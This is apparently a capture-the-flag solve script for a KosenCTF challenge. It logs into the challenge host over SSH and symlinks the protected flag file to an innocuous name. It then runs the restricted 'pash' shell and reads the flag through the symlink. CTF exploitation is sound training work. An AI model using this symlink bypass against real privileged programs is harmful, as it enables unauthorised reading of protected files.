from ptrlib import *
import time
import os

HOST = os.getenv("HOST", "0.0.0.0")
PORT = os.getenv("PORT", "9022")

sock = SSH(
    host=HOST, port=int(PORT),
    username='pwn', password='guest',
    option='/bin/sh'
)

time.sleep(0.5)
sock.sendline("mkdir -p /tmp/nekogoron")
sock.sendline("cd /tmp/nekogoron")
sock.sendline("ln -s /home/pwn/flag.txt ./hoge.txt")
sock.sendline("/home/pwn/pash")
sock.sendlineafter("(admin)$ ", "cat hoge.txt")
flag = sock.recvregex("(KosenCTF\{.+\})")[0]
sock.sendlineafter("(admin)$ ", "exit")
sock.sendline("rm -rf /tmp/nekogoron")
sock.close()

print(flag)
